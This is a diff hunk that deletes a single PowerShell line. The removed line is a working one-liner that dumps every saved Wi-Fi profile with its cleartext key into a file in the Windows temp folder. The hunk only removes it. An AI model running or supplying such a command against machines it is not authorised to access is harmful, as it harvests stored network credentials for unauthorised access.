@@ -1,1 +1,0 @@
-powershell.exe netsh wlan show profiles|Select-String -Pattern " User Profile"|ForEach-Object{echo $_.Line.split(':')[1].trim()}|ForEach-Object{netsh wlan show profiles name=$_ key=clear}|Select-String -Pattern "Key Content|SSID name" >> C:\Windows\Temp\Wifi_Passwords.txt
